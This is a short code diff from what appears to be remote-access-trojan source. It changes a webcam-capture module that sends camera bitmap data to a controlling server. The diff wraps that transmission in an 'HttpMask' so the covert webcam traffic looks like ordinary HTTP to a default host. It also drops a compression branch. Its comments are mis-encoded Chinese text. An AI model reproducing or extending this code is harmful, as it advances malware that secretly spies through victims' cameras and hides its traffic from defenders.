@@ -43,8 +43,6 @@ DWORD CVideoManager::WorkThread(LPVOID lParam)
 	This->WaitForDialogOpen();
 #if USING_ZLIB
 	const int fps = 8;// Ö¡ÂÊ
-#elif USING_LZ4
-	const int fps = 8;// Ö¡ÂÊ
 #else
 	const int fps = 8;// Ö¡ÂÊ
 #endif
@@ -103,7 +101,8 @@ void CVideoManager::SendBitMapInfor()
 	BYTE szBuffer[dwBytesLength + 3] = { 0 };
 	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
 	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
-	m_ClientObject->Send2Server((char*)szBuffer, dwBytesLength);
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)szBuffer, dwBytesLength, &mask);
 }
 
 BOOL CVideoManager::SendNextScreen()
